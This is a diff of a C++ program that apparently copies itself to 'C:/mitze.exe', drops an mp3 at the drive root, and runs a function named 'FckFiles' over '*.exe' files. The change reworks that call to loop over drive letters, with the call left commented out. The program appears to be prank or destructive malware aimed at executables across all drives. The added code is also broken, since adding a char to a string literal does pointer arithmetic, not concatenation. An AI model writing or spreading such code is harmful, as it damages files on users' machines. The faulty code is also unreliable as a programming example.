@@ -60,7 +60,15 @@ void FckFiles(std::string directory, std::string fileFilter, bool recursively = 
 }
 int main(int argc, char* argv[])
 {
+    // assigning value to string s 
+    string abc = "abcdefghijklmnopqrstuvwxyz"; 
+    char char_array[abc.length() + 1]; 
+    strcpy(char_array, abc.c_str()); 
 	CopyFile("./a.exe","C:/mitze.exe",0);
 	CopyFile("./meow.mp3","C:/meow.mp3",0);
-	FckFiles("C:/", "*.exe");
+	for(int i=0;i<abc.length();i++){
+		cout << char_array[i]+":/";
+		//FckFiles(char_array[i]+":/","*.exe");
+	}
+
 }
